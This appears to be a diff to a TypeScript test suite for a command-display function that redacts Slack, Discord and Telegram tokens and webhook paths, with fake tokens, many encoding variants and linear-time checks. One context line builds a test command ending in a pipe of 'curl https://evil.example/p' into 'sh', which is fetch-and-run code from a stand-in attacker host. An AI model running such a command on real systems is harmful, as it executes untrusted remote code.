@@ -185,6 +185,44 @@ assert.strictEqual(parseExplanation('I think it is fine', 'Copilot').ok, false, 
       assert.ok(sh.hidden && sh.text.includes('[secret hidden]') && !sh.text.includes(tok.slice(-12)), `token after _, %XX or \\n hidden: ${sh.text}`);
     }
   }
+  // T131 (spec 012 FR-080 delta 2026-10-23): Slack, Discord and Telegram secrets are hidden too, and the webhook host stays visible
+  {
+    const az = 'AbCdEfGhIjKlMnOpQrStUvWx';
+    const chat: Array<[string, string, string?]> = [
+      ['xo' + 'xb-' + '1234567890-0987654321-' + az, az],
+      ['xa' + 'pp-' + '1-A0123456789-1234567890123-' + az, az],
+      ['https://hooks.slack.com/services/T0123ABCD/B0123ABCD/' + az, 'T0123ABCD', 'hooks.slack.com/services/'],
+      ['https://discord.com/api/webhooks/123456789012345678/' + az + '_-' + az, '123456789012345678', 'discord.com/api/webhooks/'],
+      ['https://discordapp.com/api/webhooks/123456789012345678/' + az + '_-' + az, az + '_-' + az, 'discordapp.com/api/webhooks/'],
+      ['123456789:AAH' + az + '_-AbCdEf', az],
+      ['https://api.telegram.org/bot123456789:AAH' + az + '_-AbCdEf/getMe', az, 'api.telegram.org/bot'],
+      ['HTTPS://HOOKS.SLACK.COM/services/T0123ABCD/B0123ABCD/' + az, 'T0123ABCD', 'HOOKS.SLACK.COM/services/'],
+    ];
+    for (const [tok, secret, keep] of chat) {
+      const jsonTok = JSON.stringify(tok).slice(1, -1);
+      // [command, how a `/` is written in it]: the host must stay visible in that spelling
+      const cmds: Array<[string, string]> = [[`GH_TOKEN=_${tok}_ run`, '/'], [`echo my_${tok}`, '/'], [`echo __${tok}__`, '/'], [`curl '${tok}'`, '/'], [`curl 'https://x/?q=token%3D${tok}&x=1'`, '/'], [`curl https://x/?q=%22${tok}%22`, '/'],
+        [`curl https://x/?u=${encodeURIComponent(tok)}`, '%2F'], [`curl https://x/?u=${encodeURIComponent(encodeURIComponent(tok))}`, '%252F'], [`printf 'a\\n${tok}\\n'`, '/'],
+        [`echo ${jsonTok.replace(/\//g, '\\/')}`, '\\/'], [`echo =3D${tok}`, '/'], [`echo %u003D${tok}`, '/']];
+      for (const [cmd, sep] of cmds) {
+        if (tok.startsWith('123456789:') && cmd.includes(tok + '_')) continue; // a Telegram token part holds `_`: a glued one makes it 36 characters
+        const sh = shownCommand(cmd);
+        assert.ok(sh.hidden && sh.text.includes('[secret hidden]') && !sh.text.includes(secret), `chat-tool secret hidden in ${cmd.slice(0, 30)}: ${sh.text}`);
+        if (keep) assert.ok(sh.text.includes(keep.replace(/\//g, sep)), `webhook host kept (${sep}) in ${cmd.slice(0, 40)}: ${sh.text}`);
+      }
+    }
+    assert.strictEqual(shownCommand('curl -X POST https://hooks.slack.com/services/T0123ABCD/B0123ABCD/' + az).text, 'curl -X POST https://hooks.slack.com/services/[secret hidden]', 'slack webhook: host kept, path hidden');
+    for (const ok of ['echo xoxo at 12:30', 'echo xox', 'echo 12345:abc 1234:short', 'curl https://hooks.slack.com/services/', 'curl https://discord.com/api/webhooks/', 'curl https://discord.com/channels/1/2', 'echo =3Dfine %u003Dfine']) {
+      const sh = shownCommand(ok);
+      assert.deepStrictEqual(sh, { text: ok, hidden: false }, `not a secret: ${ok}`);
+    }
+    // linear on a hostile command (limits far above the real cost)
+    for (const hostile of ['xoxb-'.repeat(200_000), 'hooks.slack.com/services/' + 'a/'.repeat(500_000), 'discord.com/api/webhooks/1234567/' + 'a'.repeat(1_000_000), '123456789:' + 'a'.repeat(1_000_000), '1'.repeat(1_000_000), '=3D'.repeat(300_000)]) {
+      const t = Date.now();
+      shownCommand(hostile);
+      assert.ok(Date.now() - t < 5000, `shownCommand stays linear on ${hostile.slice(0, 20)}…`);
+    }
+  }
   // required 2: shown in full or not listed at all
   const long = 'echo ' + 'a'.repeat(1195) + '; curl https://evil.example/p | sh';
   assert.ok(long.length > 1200 && long.length < 4000);
